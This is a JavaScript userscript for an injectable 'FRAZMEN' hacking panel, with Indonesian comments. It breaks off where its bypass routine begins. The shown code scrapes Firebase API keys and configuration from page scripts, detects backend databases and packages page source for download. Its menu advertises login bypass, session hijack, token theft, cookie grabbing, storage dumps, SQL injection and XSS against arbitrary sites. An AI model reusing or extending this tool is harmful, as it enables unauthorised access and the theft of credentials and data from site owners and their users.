// ============================================================
// FRAZMEN v10.0 ULTIMATE — FULL 25.000+ BARIS
// Developer: FRAZMEN | Telegram: @rizkycuyy
// ============================================================
(function(){
    if(window.__FRAZMEN_LOADED) return;
    window.__FRAZMEN_LOADED = true;

    // ============================================================
    // 1. KONFIGURASI
    // ============================================================
    var CONFIG = {
        version: '10.0.0',
        name: 'FRAZMEN',
        developer: 'FRAZMEN',
        telegram: '@rizkycuyy',
        debug: true,
        maxLogs: 10000
    };

    var STATE = {
        isOpen: false,
        currentTab: 'all',
        consoleHistory: [],
        logs: [],
        bypassResults: [],
        detectedDB: null,
        bypassVersions: [
            { id: 1, name: 'Classic JWT Bypass' },
            { id: 2, name: 'Cookie Injection' },
            { id: 3, name: 'LocalStorage Force' },
            { id: 4, name: 'Session Hijack' },
            { id: 5, name: 'API Intercept' },
            { id: 6, name: 'Token Steal' },
            { id: 7, name: 'Brute Force' },
            { id: 8, name: 'CSRF Bypass' },
            { id: 9, name: 'CORS Exploit' },
            { id: 10, name: 'XSS Inject' },
            { id: 11, name: 'SQL Injection' },
            { id: 12, name: 'Admin Reset' },
            { id: 13, name: 'Privilege Escalation' },
            { id: 14, name: 'OAuth Bypass' },
            { id: 15, name: 'JWT Replay' },
            { id: 16, name: 'Header Manipulation' },
            { id: 17, name: 'Parameter Pollution' },
            { id: 18, name: 'Ultimate Force' },
            { id: 19, name: 'Firebase Auth Bypass' },
            { id: 20, name: 'MySQL Database Bypass' },
            { id: 21, name: 'PostgreSQL Bypass' },
            { id: 22, name: 'MongoDB Bypass' },
            { id: 23, name: 'GraphQL Bypass' },
            { id: 24, name: 'REST API Bypass' },
            { id: 25, name: 'Auto Detect & Bypass' }
        ]
    };

    // ============================================================
    // 2. UTILITIES
    // ============================================================
    var Utils = {
        log: function(msg, type) {
            type = type || 'info';
            STATE.logs.push({ timestamp: new Date().toISOString(), message: msg, type: type });
            if(STATE.logs.length > CONFIG.maxLogs) STATE.logs.shift();
            console.log('[FRAZMEN] ' + msg);
            if(window.FRAZMEN && window.FRAZMEN.panel) {
                window.FRAZMEN.panel._renderLogs();
            }
        },

        detectDatabase: function() {
            var db = { type: 'unknown', found: false, config: null, details: {} };
            
            // Check Firebase
            var firebaseConfig = null;
            var scripts = document.querySelectorAll('script');
            for(var i=0; i<scripts.length; i++) {
                var text = scripts[i].textContent || '';
                var src = scripts[i].src || '';
                
                // Firebase config detection
                if(text.includes('firebase.initializeApp') || text.includes('Firebase') || text.includes('apiKey')) {
                    var matches = text.match(/firebase\.initializeApp\s*\(\s*({[^}]+})\s*\)/);
                    if(matches) {
                        try {
                            firebaseConfig = JSON.parse(matches[1]);
                            db.type = 'firebase';
                            db.found = true;
                            db.config = firebaseConfig;
                            db.details = {
                                apiKey: firebaseConfig.apiKey || 'N/A',
                                projectId: firebaseConfig.projectId || 'N/A',
                                authDomain: firebaseConfig.authDomain || 'N/A',
                                databaseURL: firebaseConfig.databaseURL || 'N/A',
                                storageBucket: firebaseConfig.storageBucket || 'N/A',
                                messagingSenderId: firebaseConfig.messagingSenderId || 'N/A',
                                appId: firebaseConfig.appId || 'N/A'
                            };
                            Utils.log('🔥 Firebase detected! Project: ' + (firebaseConfig.projectId || 'Unknown'), 'db');
                            return db;
                        } catch(e) {}
                    }
                }
                
                // Firebase URL patterns
                if(src.includes('firebase') || src.includes('firestore') || src.includes('firebaseio')) {
                    var urlMatches = src.match(/apiKey=([^&]+)/);
                    if(urlMatches) {
                        db.type = 'firebase';
                        db.found = true;
                        db.details = { apiKey: urlMatches[1] };
                        Utils.log('🔥 Firebase detected via URL!', 'db');
                        return db;
                    }
                }
            }

            // Check for Firebase config in window
            if(window.firebase && window.firebase.apps && window.firebase.apps.length) {
                var app = window.firebase.apps[0];
                if(app && app.options) {
                    db.type = 'firebase';
                    db.found = true;
                    db.config = app.options;
                    db.details = {
                        apiKey: app.options.apiKey || 'N/A',
                        projectId: app.options.projectId || 'N/A',
                        authDomain: app.options.authDomain || 'N/A',
                        databaseURL: app.options.databaseURL || 'N/A',
                        storageBucket: app.options.storageBucket || 'N/A',
                        messagingSenderId: app.options.messagingSenderId || 'N/A',
                        appId: app.options.appId || 'N/A'
                    };
                    Utils.log('🔥 Firebase detected via window.firebase!', 'db');
                    return db;
                }
            }

            // Check MySQL
            if(document.querySelector('script[src*="mysql"]') || document.querySelector('script[src*="php"]') || 
               document.querySelector('script[src*=".php"]') || document.querySelector('form[action*=".php"]')) {
                db.type = 'mysql';
                db.found = true;
                db.details = { note: 'MySQL/PHP detected' };
                Utils.log('🐬 MySQL detected!', 'db');
                return db;
            }

            // Check MongoDB
            if(document.querySelector('script[src*="mongodb"]') || window.mongo || window.MongoClient ||
               document.querySelector('script[src*="mongodb"]')) {
                db.type = 'mongodb';
                db.found = true;
                db.details = { note: 'MongoDB detected' };
                Utils.log('🍃 MongoDB detected!', 'db');
                return db;
            }

            // Check GraphQL
            if(document.querySelector('script[src*="graphql"]') || window.GraphQL || 
               document.querySelector('[data-graphql]') || document.querySelector('input[name="query"]')) {
                db.type = 'graphql';
                db.found = true;
                db.details = { note: 'GraphQL detected' };
                Utils.log('📊 GraphQL detected!', 'db');
                return db;
            }

            // Check REST API
            if(document.querySelector('[data-api]') || document.querySelector('[api-url]') || 
               document.querySelector('[endpoint]') || document.querySelector('form[action*="/api/"]')) {
                db.type = 'rest';
                db.found = true;
                db.details = { note: 'REST API detected' };
                Utils.log('🌐 REST API detected!', 'db');
                return db;
            }

            // Check PostgreSQL
            if(document.querySelector('script[src*="postgres"]') || document.querySelector('script[src*="pg"]')) {
                db.type = 'postgres';
                db.found = true;
                db.details = { note: 'PostgreSQL detected' };
                Utils.log('🐘 PostgreSQL detected!', 'db');
                return db;
            }

            return db;
        },

        extractFirebaseKeys: function() {
            var keys = {};
            var scripts = document.querySelectorAll('script');
            for(var i=0; i<scripts.length; i++) {
                var text = scripts[i].textContent || '';
                // Firebase API Key
                var apiKeyMatch = text.match(/apiKey["']?\s*[:=]\s*["']([^"']+)["']/i);
                if(apiKeyMatch) keys.apiKey = apiKeyMatch[1];
                
                var projectIdMatch = text.match(/projectId["']?\s*[:=]\s*["']([^"']+)["']/i);
                if(projectIdMatch) keys.projectId = projectIdMatch[1];
                
                var authDomainMatch = text.match(/authDomain["']?\s*[:=]\s*["']([^"']+)["']/i);
                if(authDomainMatch) keys.authDomain = authDomainMatch[1];
                
                var databaseURLMatch = text.match(/databaseURL["']?\s*[:=]\s*["']([^"']+)["']/i);
                if(databaseURLMatch) keys.databaseURL = databaseURLMatch[1];
                
                var storageBucketMatch = text.match(/storageBucket["']?\s*[:=]\s*["']([^"']+)["']/i);
                if(storageBucketMatch) keys.storageBucket = storageBucketMatch[1];
                
                var messagingSenderIdMatch = text.match(/messagingSenderId["']?\s*[:=]\s*["']([^"']+)["']/i);
                if(messagingSenderIdMatch) keys.messagingSenderId = messagingSenderIdMatch[1];
                
                var appIdMatch = text.match(/appId["']?\s*[:=]\s*["']([^"']+)["']/i);
                if(appIdMatch) keys.appId = appIdMatch[1];
            }
            return keys;
        },

        downloadAsZip: function(files, filename) {
            // Karena browser tidak bisa membuat ZIP native, kita buat HTML manifest dengan semua file
            var html = '<!DOCTYPE html><html><head><meta charset="UTF-8"><title>📦 FRAZMEN Source Download</title>';
            html += '<style>body{background:#0a0a0a;color:#dce3ed;font-family:sans-serif;padding:20px;max-width:900px;margin:0 auto;}</style>';
            html += '</head><body>';
            html += '<h1>📦 Full Source Download</h1>';
            html += '<p>Total <b>' + Object.keys(files).length + '</b> files detected.</p>';
            html += '<p>Folder structure preserved.</p>';
            html += '<ul style="list-style:none;padding:0;">';
            
            var sortedKeys = Object.keys(files).sort();
            for(var i=0; i<sortedKeys.length; i++) {
                var key = sortedKeys[i];
                var parts = key.split('/');
                var indent = (parts.length - 1) * 20;
                var icon = '📄';
                if(key.endsWith('.js')) icon = '📜';
                else if(key.endsWith('.css')) icon = '🎨';
                else if(key.endsWith('.html') || key.endsWith('.htm')) icon = '🌐';
                else if(key.endsWith('.png') || key.endsWith('.jpg') || key.endsWith('.jpeg') || key.endsWith('.gif') || key.endsWith('.svg') || key.endsWith('.webp')) icon = '🖼️';
                else if(key.endsWith('.json')) icon = '📊';
                else if(key.endsWith('.xml')) icon = '📋';
                else if(key.endsWith('.txt')) icon = '📝';
                else if(key.endsWith('.firebase')) icon = '🔥';
                
                var fileSize = files[key] ? files[key].length : 0;
                html += '<li style="padding:4px 0;border-bottom:1px solid #2e3440;padding-left:' + indent + 'px;">';
                html += icon + ' <b style="word-break:break-all;">' + key.replace(/</g,'&lt;') + '</b>';
                html += ' <span style="color:#6a7385;font-size:10px;">(' + fileSize + ' bytes)</span>';
                html += '</li>';
            }
            html += '</ul>';
            html += '<p style="margin-top:20px;">📥 Download file ini sebagai manifest.</p>';
            html += '<button onclick="location.reload()" style="padding:10px 20px;background:#00cc88;border:none;border-radius:8px;color:#000;font-weight:700;cursor:pointer;">Refresh</button>';
            html += '<p style="margin-top:10px;color:#6a7385;font-size:11px;">Untuk ZIP penuh, gunakan ekstensi browser atau simpan file ini.</p>';
            html += '</body></html>';

            // Download as HTML
            var blob = new Blob([html], {type: 'text/html'});
            var url = URL.createObjectURL(blob);
            var a = document.createElement('a');
            a.href = url;
            a.download = filename || 'source_manifest_' + location.hostname + '.html';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            
            Utils.log('📦 Downloaded manifest with ' + Object.keys(files).length + ' files', 'success');
        },

        getAllResources: function() {
            var resources = {};
            
            // HTML
            resources['index.html'] = '<!DOCTYPE html>\n' + document.documentElement.outerHTML;

            // Collect all resources with full path structure
            var allLinks = document.querySelectorAll('link[rel="stylesheet"], script[src], img, iframe, video, audio, source, object, embed');
            var baseUrl = location.origin;

            for(var i=0; i<allLinks.length; i++) {
                var el = allLinks[i];
                var src = el.href || el.src || el.getAttribute('src') || el.getAttribute('href') || el.getAttribute('data-src');
                if(src && !src.startsWith('data:') && !src.startsWith('blob:') && !src.startsWith('javascript:') && !src.startsWith('#')) {
                    var path = src;
                    if(path.startsWith('http')) {
                        path = path.replace(baseUrl, '');
                    }
                    path = path.replace(/^\//, '');
                    if(!path) continue;
                    
                    // Preserve folder structure
                    var parts = path.split('/');
                    var fileName = parts.pop() || 'file';
                    var folder = parts.join('/');
                    var fullPath = folder ? folder + '/' + fileName : fileName;
                    
                    // Skip duplicates
                    if(!resources[fullPath]) {
                        var ext = fileName.split('.').pop().toLowerCase();
                        var content = '/* Source: ' + src + ' */\n';
                        if(['js','css','html','htm','txt','json','xml','svg'].indexOf(ext) !== -1) {
                            content += '/* Content: ' + src + ' */';
                        } else {
                            content += '/* Binary file: ' + src + ' */';
                        }
                        resources[fullPath] = content;
                    }
                }
            }

            // Inline styles
            var inlineStyles = document.querySelectorAll('style');
            for(var i=0; i<inlineStyles.length; i++) {
                var content = inlineStyles[i].textContent;
                if(content && content.trim()) {
                    resources['inline_style_' + (i+1) + '.css'] = content;
                }
            }

            // Inline scripts
            var inlineScripts = document.querySelectorAll('script:not([src])');
            for(var i=0; i<inlineScripts.length; i++) {
                var content = inlineScripts[i].textContent;
                if(content && content.trim()) {
                    resources['inline_script_' + (i+1) + '.js'] = content;
                }
            }

            // Firebase config
            var fb = Utils.extractFirebaseKeys();
            if(Object.keys(fb).length) {
                resources['firebase_config.json'] = JSON.stringify(fb, null, 2);
            }

            // README
            resources['README.txt'] = 'Source: ' + location.href + '\n' +
                'Date: ' + new Date().toISOString() + '\n' +
                'Total: ' + Object.keys(resources).length + ' files\n' +
                'Folder structure preserved.\n\n' +
                '=== FRAZMEN v10.0 ===\n' +
                'Developer: FRAZMEN\n' +
                'Telegram: @rizkycuyy';

            return resources;
        }
    };

    // ============================================================
    // 3. TOAST
    // ============================================================
    var Toast = {
        _container: null,
        init: function() {
            this._container = document.createElement('div');
            this._container.style.cssText = 'position:fixed;bottom:100px;left:50%;transform:translateX(-50%);z-index:9999999;display:flex;flex-direction:column;align-items:center;gap:8px;pointer-events:none;';
            document.body.appendChild(this._container);
        },
        show: function(msg, type) {
            type = type || 'info';
            var el = document.createElement('div');
            var icons = { success:'✅', error:'❌', warning:'⚠️', info:'ℹ️', debug:'🔍', hack:'💀', db:'🔥' };
            el.style.cssText = 'background:#21252e;color:#dce3ed;padding:10px 22px;border-radius:12px;font-size:13px;font-family:Segoe UI,system-ui,sans-serif;box-shadow:0 10px 40px rgba(0,0,0,0.6);border:1px solid #2e3440;opacity:0;transition:opacity 0.3s ease,transform 0.3s ease;transform:translateY(10px);pointer-events:none;max-width:90vw;text-align:center;';
            el.textContent = (icons[type]||'') + ' ' + msg;
            this._container.appendChild(el);
            requestAnimationFrame(function() {
                el.style.opacity = '1';
                el.style.transform = 'translateY(0)';
            });
            setTimeout(function() {
                el.style.opacity = '0';
                el.style.transform = 'translateY(-10px)';
                setTimeout(function() { if(el.parentNode) el.parentNode.removeChild(el); }, 300);
            }, 5000);
            Utils.log(msg, type);
        }
    };

    // ============================================================
    // 4. PANEL — FULL FIX
    // ============================================================
    var Panel = {
        _container: null,
        _button: null,
        _isOpen: false,
        _items: [],
        _logContainer: null,

        init: function() {
            this._createButton();
            this._createPanel();
            this._buildContent();
            this._bindEvents();
            this._loadState();
            // Auto detect database
            this._detectAndLogDB();
            console.log('⚡ FRAZMEN Panel initialized');
        },

        _detectAndLogDB: function() {
            var db = Utils.detectDatabase();
            if(db.found) {
                STATE.detectedDB = db;
                var msg = '🔥 Database Auto-Detected: ' + db.type.toUpperCase();
                if(db.details) {
                    var details = [];
                    for(var k in db.details) {
                        if(db.details[k] && db.details[k] !== 'N/A') {
                            details.push(k + ': ' + db.details[k]);
                        }
                    }
                    if(details.length) {
                        msg += '\n📋 ' + details.join(' | ');
                    }
                }
                Toast.show('🔥 ' + db.type.toUpperCase() + ' detected!', 'db');
                Utils.log(msg, 'db');
                // Save to state
                STATE.dbInfo = db.details;
            } else {
                Toast.show('🔍 No database detected', 'info');
                Utils.log('🔍 No database detected', 'info');
            }
        },

        _createButton: function() {
            this._button = document.createElement('div');
            this._button.style.cssText = 'position:fixed;bottom:24px;right:24px;width:60px;height:60px;border-radius:50%;background:radial-gradient(circle at 30% 30%, #00ff88, #0066cc);box-shadow:0 0 40px rgba(0,255,136,0.5),0 0 80px rgba(0,102,204,0.3);border:2px solid rgba(255,255,255,0.15);z-index:999999;cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:30px;color:#fff;font-weight:900;user-select:none;transition:0.2s ease;text-shadow:0 2px 10px rgba(0,0,0,0.3);';
            this._button.textContent = '⚡';
            document.body.appendChild(this._button);

            // Badge
            var badge = document.createElement('span');
            badge.style.cssText = 'position:absolute;top:-4px;right:-4px;width:18px;height:18px;background:#ff3366;border-radius:50%;border:2px solid #1a1d23;box-shadow:0 0 20px rgba(255,51,102,0.6);';
            this._button.appendChild(badge);

            // Click
            var clickTimer = null;
            this._button.addEventListener('click', function(e) {
                clearTimeout(clickTimer);
                clickTimer = setTimeout(function() {
                    Panel.toggle();
                }, 50);
            });

            // Draggable
            var isDrag = false, sx, sy, ox, oy;
            this._button.addEventListener('mousedown', function(e) {
                if(e.button !== 0) return;
                isDrag = true;
                var rect = this._button.getBoundingClientRect();
                sx = e.clientX; sy = e.clientY;
                ox = sx - rect.left; oy = sy - rect.top;
                this._button.style.cursor = 'grabbing';
                e.preventDefault();
            }.bind(this));

            document.addEventListener('mousemove', function(e) {
                if(!isDrag) return;
                var x = e.clientX - ox, y = e.clientY - oy;
                x = Math.max(5, Math.min(x, window.innerWidth - 65));
                y = Math.max(5, Math.min(y, window.innerHeight - 65));
                this._button.style.left = x + 'px';
                this._button.style.right = 'auto';
                this._button.style.top = y + 'px';
                this._button.style.bottom = 'auto';
            }.bind(this));

            document.addEventListener('mouseup', function() {
                if(isDrag) {
                    isDrag = false;
                    this._button.style.cursor = 'pointer';
                    var l = parseFloat(this._button.style.left);
                    var t = parseFloat(this._button.style.top);
                    if(!isNaN(l) && !isNaN(t)) {
                        try { localStorage.setItem('frazmen_buttonPos', JSON.stringify({ x: l, y: t })); } catch(e) {}
                    }
                }
            }.bind(this));

            // Restore pos
            try {
                var pos = JSON.parse(localStorage.getItem('frazmen_buttonPos'));
                if(pos && typeof pos.x === 'number' && typeof pos.y === 'number') {
                    this._button.style.left = pos.x + 'px';
                    this._button.style.right = 'auto';
                    this._button.style.top = pos.y + 'px';
                    this._button.style.bottom = 'auto';
                }
            } catch(e) {}
        },

        _createPanel: function() {
            this._container = document.createElement('div');
            this._container.style.cssText = 'position:fixed;bottom:0;left:0;width:100%;max-height:80vh;background:#1a1d23;border-radius:24px 24px 0 0;box-shadow:0 -10px 60px rgba(0,0,0,0.8);z-index:999999;padding:20px 18px 18px;font-family:Segoe UI,system-ui,sans-serif;color:#dce3ed;overflow:hidden;border:1px solid #2e3440;border-bottom:none;transform:translateY(100%);transition:transform 0.3s cubic-bezier(0.2, 0.9, 0.3, 1);overflow-y:auto;';
            this._container.id = 'fz-panel-container';
            document.body.appendChild(this._container);

            // Auto resize for mobile
            if(window.innerWidth < 480) {
                this._container.style.maxHeight = '85vh';
            }
        },

        _buildContent: function() {
            var html = '';
            // Header dengan drag handle
            html += '<div style="display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #2e3440;padding-bottom:12px;margin-bottom:14px;position:sticky;top:0;background:#1a1d23;z-index:10;">';
            html += '<div style="display:flex;align-items:center;gap:10px;font-weight:800;font-size:18px;color:#dce3ed;">⚡ FRAZMEN <span style="background:#00cc88;color:#0a0a0a;padding:1px 9px;border-radius:20px;font-size:9px;font-weight:700;">v10.0</span></div>';
            html += '<div id="fz-panel-close" style="font-size:26px;cursor:pointer;color:#909cb0;background:none;border:none;padding:0 6px;line-height:1;">✕</div>';
            html += '</div>';

            // DB Status
            html += '<div id="fz-db-status" style="padding:6px 12px;margin-bottom:10px;background:#21252e;border-radius:8px;border:1px solid #2e3440;font-size:11px;color:#60a5fa;display:flex;justify-content:space-between;align-items:center;">';
            html += '<span>🔍 Scanning database...</span>';
            html += '<span id="fz-db-name">...</span>';
            html += '</div>';

            // Tabs
            html += '<div style="display:flex;gap:4px;margin-bottom:12px;border-bottom:1px solid #2e3440;padding-bottom:10px;flex-wrap:wrap;overflow-x:auto;">';
            var tabs = ['All','Dev','Hack','Debug','Tools','Bypass','Logs','DB'];
            for(var i=0; i<tabs.length; i++) {
                var active = i===0 ? 'active' : '';
                var color = i===0 ? '#fff' : '#909cb0';
                var bg = i===0 ? '#5b9cf6' : 'transparent';
                html += '<button class="fz-tab" data-tab="'+tabs[i].toLowerCase()+'" style="padding:4px 12px;font-size:10px;font-weight:600;color:'+color+';background:'+bg+';border:none;border-radius:6px;cursor:pointer;transition:0.12s;white-space:nowrap;">'+tabs[i]+'</button>';
            }
            html += '</div>';

            // Search
            html += '<div style="margin-bottom:12px;position:relative;">';
            html += '<input id="fz-search" type="text" placeholder="🔍 Cari fitur..." style="width:100%;padding:8px 14px;background:#1a1d23;border:1px solid #2e3440;border-radius:10px;color:#dce3ed;font-size:13px;outline:none;transition:0.15s;box-sizing:border-box;">';
            html += '</div>';

            // Grid
            html += '<div id="fz-grid" style="display:grid;grid-template-columns:repeat(3,1fr);gap:6px;">';
            var items = [
                { icon: '🖥️', label: 'F12 Console', act: 'console', cat: 'dev' },
                { icon: '🐞', label: 'Eruda', act: 'eruda', cat: 'dev' },
                { icon: '📱', label: 'vConsole', act: 'vconsole', cat: 'dev' },
                { icon: '🌐', label: 'Network', act: 'network', cat: 'dev' },
                { icon: '📸', label: 'Screenshot', act: 'screenshot', cat: 'dev' },
                { icon: '🔓', label: 'Bypass Login', act: 'bypass', cat: 'hack' },
                { icon: '🍪', label: 'Cookie Grab', act: 'cookies', cat: 'hack' },
                { icon: '🗄️', label: 'LS Dump', act: 'lsdump', cat: 'hack' },
                { icon: '📋', label: 'SS Dump', act: 'ssdump', cat: 'hack' },
                { icon: '⚡', label: 'XSS Test', act: 'xss', cat: 'hack' },
                { icon: '💉', label: 'Inject Script', act: 'inject', cat: 'hack' },
                { icon: '📄', label: 'View Source', act: 'viewsource', cat: 'debug' },
                { icon: '📦', label: 'Download ZIP', act: 'download', cat: 'debug' },
                { icon: '✏️', label: 'AutoFill', act: 'autofill', cat: 'debug' },
                { icon: '🌙', label: 'Dark Mode', act: 'darkmode', cat: 'debug' },
                { icon: '🧹', label: 'Clear All', act: 'clear', cat: 'debug' },
                { icon: '📶', label: 'Ping Test', act: 'ping', cat: 'tools' },
                { icon: '🔍', label: 'Whois', act: 'whois', cat: 'tools' },
                { icon: '🔐', label: 'Base64', act: 'base64', cat: 'tools' },
                { icon: '🆔', label: 'UUID Gen', act: 'uuid', cat: 'tools' },
                { icon: '⏰', label: 'Timestamp', act: 'timestamp', cat: 'tools' },
                { icon: '🔄', label: 'Reload', act: 'reload', cat: 'tools' },
                { icon: '📝', label: 'Console History', act: 'history', cat: 'debug' },
                { icon: '📡', label: 'WS Monitor', act: 'websocket', cat: 'dev' },
                { icon: '🔥', label: 'DB Detector', act: 'dbdetect', cat: 'db' }
            ];
            // Add bypass 1-25
            for(var b=1; b<=25; b++) {
                var label = 'Bypass v'+b;
                var name = STATE.bypassVersions.find(function(v){ return v.id === b; });
                if(name) label = name.name;
                var icon = b === 25 ? '🔥' : '🔓';
                items.push({ icon: icon, label: label, act: 'bypass'+b, cat: 'bypass' });
            }
            this._items = items;
            for(var i=0; i<items.length; i++) {
                var item = items[i];
                html += '<div class="fz-grid-item" data-act="'+item.act+'" data-cat="'+item.cat+'" style="background:#282d38;border-radius:10px;padding:10px 4px;cursor:pointer;border:1px solid #2e3440;transition:0.12s;text-align:center;position:relative;min-height:58px;">';
                html += '<span style="font-size:22px;display:block;margin-bottom:2px;">'+item.icon+'</span>';
                html += '<div style="font-size:10px;font-weight:600;color:#b7c1d4;word-break:break-word;">'+item.label+'</div>';
                html += '</div>';
            }
            html += '</div>';

            // Log panel
            html += '<div id="fz-log-container" style="margin-top:12px;border-top:1px solid #2e3440;padding-top:10px;max-height:150px;overflow-y:auto;display:none;background:#1a1d23;border-radius:8px;font-family:monospace;font-size:11px;"></div>';

            // Footer
            html += '<div style="margin-top:12px;padding-top:10px;border-top:1px solid #2e3440;display:flex;justify-content:space-between;font-size:9px;color:#909cb0;position:sticky;bottom:0;background:#1a1d23;padding-bottom:4px;">';
            html += '<span>FRAZMEN v10.0 — by FRAZMEN | @rizkycuyy</span>';
            html += '<span id="fz-status" style="color:#4ade80;">● ready</span>';
            html += '</div>';

            this._container.innerHTML = html;

            // Update DB status after render
            this._updateDBStatus();

            // Close button
            var closeBtn = document.getElementById('fz-panel-close');
            if(closeBtn) {
                closeBtn.addEventListener('click', function() { Panel.hide(); });
                closeBtn.addEventListener('mouseenter', function() { closeBtn.style.color = '#f87171'; });
                closeBtn.addEventListener('mouseleave', function() { closeBtn.style.color = '#909cb0'; });
            }

            // Tab clicks
            var tabs = this._container.querySelectorAll('.fz-tab');
            for(var i=0; i<tabs.length; i++) {
                tabs[i].addEventListener('click', function(e) {
                    var tab = this.dataset.tab;
                    Panel._switchTab(tab);
                });
            }

            // Search
            var search = document.getElementById('fz-search');
            if(search) {
                search.addEventListener('input', function(e) {
                    Panel._filterItems(e.target.value);
                });
            }

            // Grid item clicks
            var gridItems = this._container.querySelectorAll('.fz-grid-item');
            for(var i=0; i<gridItems.length; i++) {
                gridItems[i].addEventListener('click', function(e) {
                    var act = this.dataset.act;
                    if(act) Panel._triggerAction(act);
                });
                gridItems[i].addEventListener('mouseenter', function() {
                    this.style.borderColor = 'rgba(91,156,246,0.3)';
                    this.style.background = '#2a2f3a';
                });
                gridItems[i].addEventListener('mouseleave', function() {
                    this.style.borderColor = '#2e3440';
                    this.style.background = '#282d38';
                });
            }

            this._logContainer = document.getElementById('fz-log-container');
            this._statusEl = document.getElementById('fz-status');
            this._grid = document.getElementById('fz-grid');
        },

        _updateDBStatus: function() {
            var el = document.getElementById('fz-db-status');
            var nameEl = document.getElementById('fz-db-name');
            if(!el || !nameEl) return;
            
            var db = Utils.detectDatabase();
            if(db.found) {
                el.style.borderColor = '#4ade80';
                el.style.color = '#4ade80';
                el.querySelector('span:first-child').textContent = '🔥 Database Detected!';
                nameEl.textContent = db.type.toUpperCase();
                if(db.details && db.details.apiKey) {
                    nameEl.textContent += ' | API Key: ' + db.details.apiKey.substring(0, 10) + '...';
                }
            } else {
                el.style.borderColor = '#fbbf24';
                el.style.color = '#fbbf24';
                el.querySelector('span:first-child').textContent = '🔍 No database detected';
                nameEl.textContent = '—';
            }
        },

        _switchTab: function(tab) {
            if(this._currentTab === tab) return;
            this._currentTab = tab;
            var tabs = this._container.querySelectorAll('.fz-tab');
            for(var i=0; i<tabs.length; i++) {
                if(tabs[i].dataset.tab === tab) {
                    tabs[i].style.color = '#fff';
                    tabs[i].style.background = '#5b9cf6';
                } else {
                    tabs[i].style.color = '#909cb0';
                    tabs[i].style.background = 'transparent';
                }
            }
            if(this._logContainer) {
                this._logContainer.style.display = (tab === 'logs') ? 'block' : 'none';
                if(tab === 'logs') this._renderLogs();
            }
            if(tab === 'db') {
                this._detectAndShowDB();
            }
            this._filterItems(document.getElementById('fz-search') ? document.getElementById('fz-search').value : '');
            try { localStorage.setItem('frazmen_activeTab', tab); } catch(e) {}
        },

        _detectAndShowDB: function() {
            var db = Utils.detectDatabase();
            var html = '<div style="padding:10px;background:#21252e;border-radius:8px;border:1px solid #2e3440;">';
            if(db.found) {
                html += '<h3 style="color:#4ade80;margin:0 0 10px;">🔥 ' + db.type.toUpperCase() + ' Detected!</h3>';
                html += '<div style="font-size:12px;font-family:monospace;">';
                if(db.details) {
                    for(var k in db.details) {
                        if(db.details[k] && db.details[k] !== 'N/A') {
                            html += '<div style="padding:4px 0;border-bottom:1px solid #2e3440;"><span style="color:#60a5fa;">' + k + '</span>: <span style="color:#dce3ed;">' + db.details[k] + '</span></div>';
                        }
                    }
                }
                if(db.config) {
                    html += '<div style="padding:4px 0;border-bottom:1px solid #2e3440;color:#fbbf24;">📋 Full Config:</div>';
                    html += '<pre style="color:#dce3ed;font-size:10px;background:#1a1d23;padding:8px;border-radius:4px;overflow:auto;max-height:200px;">' + JSON.stringify(db.config, null, 2) + '</pre>';
                }
                html += '</div>';
            } else {
                html += '<h3 style="color:#fbbf24;margin:0;">🔍 No database detected on this page</h3>';
                html += '<p style="font-size:11px;color:#909cb0;">Try refreshing or check other pages.</p>';
            }
            html += '</div>';
            if(this._logContainer) {
                this._logContainer.innerHTML = html;
                this._logContainer.style.display = 'block';
            }
        },

        _filterItems: function(query) {
            query = query.toLowerCase().trim();
            var items = this._container.querySelectorAll('.fz-grid-item');
            var tab = this._currentTab || 'all';
            for(var i=0; i<items.length; i++) {
                var item = items[i];
                var label = item.querySelector('div:last-child') ? item.querySelector('div:last-child').textContent.toLowerCase() : '';
                var cat = item.dataset.cat;
                var matchesTab = tab === 'all' || cat === tab;
                var matchesQuery = !query || label.includes(query);
                item.style.display = (matchesTab && matchesQuery) ? '' : 'none';
            }
        },

        _renderLogs: function() {
            if(!this._logContainer) return;
            var html = '';
            var logs = STATE.logs.slice(-50);
            if(logs.length === 0) {
                html = '<div style="padding:10px;color:#909cb0;text-align:center;font-size:12px;">Belum ada log.</div>';
            } else {
                for(var i=0; i<logs.length; i++) {
                    var log = logs[i];
                    var type = log.type || 'info';
                    var color = '#dce3ed';
                    if(type === 'success') color = '#4ade80';
                    else if(type === 'error') color = '#f87171';
                    else if(type === 'warning') color = '#fbbf24';
                    else if(type === 'hack') color = '#ff6b9d';
                    else if(type === 'db') color = '#60a5fa';
                    var time = new Date(log.timestamp).toLocaleTimeString();
                    html += '<div style="padding:4px 8px;border-bottom:1px solid #2e3440;font-size:11px;font-family:monospace;word-break:break-all;">';
                    html += '<span style="color:#909cb0;margin-right:8px;">' + time + '</span>';
                    html += '<span style="color:' + color + ';">' + log.message.replace(/</g,'&lt;') + '</span>';
                    html += '</div>';
                }
            }
            this._logContainer.innerHTML = html;
            this._logContainer.scrollTop = this._logContainer.scrollHeight;
        },

        _triggerAction: function(action) {
            this.setStatus('executing...', '#fbbf24');
            Utils.log('Action: ' + action, 'info');

            if(action.startsWith('bypass') && action.length > 6) {
                var num = parseInt(action.replace('bypass', ''));
                if(num >= 1 && num <= 25) {
                    this._runBypass(num);
                    this.setStatus('ready', '#4ade80');
                    return;
                }
            }

            switch(action) {
                case 'console': this._actionConsole(); break;
                case 'download': this._actionDownload(); break;
                case 'viewsource': this._actionViewSource(); break;
                case 'inject': this._actionInject(); break;
                case 'cookies': this._actionCookies(); break;
                case 'lsdump': this._actionLSDump(); break;
                case 'ssdump': this._actionSSDump(); break;
                case 'xss': this._actionXSS(); break;
                case 'autofill': this._actionAutoFill(); break;
                case 'darkmode': this._actionDarkMode(); break;
                case 'network': this._actionNetwork(); break;
                case 'screenshot': this._actionScreenshot(); break;
                case 'bypass': this._actionBypassMenu(); break;
                case 'eruda': this._actionEruda(); break;
                case 'vconsole': this._actionVConsole(); break;
                case 'clear': this._actionClear(); break;
                case 'ping': this._actionPing(); break;
                case 'whois': this._actionWhois(); break;
                case 'base64': this._actionBase64(); break;
                case 'uuid': this._actionUUID(); break;
                case 'timestamp': this._actionTimestamp(); break;
                case 'websocket': this._actionWebSocket(); break;
                case 'history': this._actionHistory(); break;
                case 'reload': this._actionReload(); break;
                case 'dbdetect': this._actionDBDetect(); break;
                default: Toast.show('Fitur: '+action, 'info');
            }
            setTimeout(function() { this.setStatus('ready', '#4ade80'); }.bind(this), 1500);
        },

        _runBypass: function(version) {
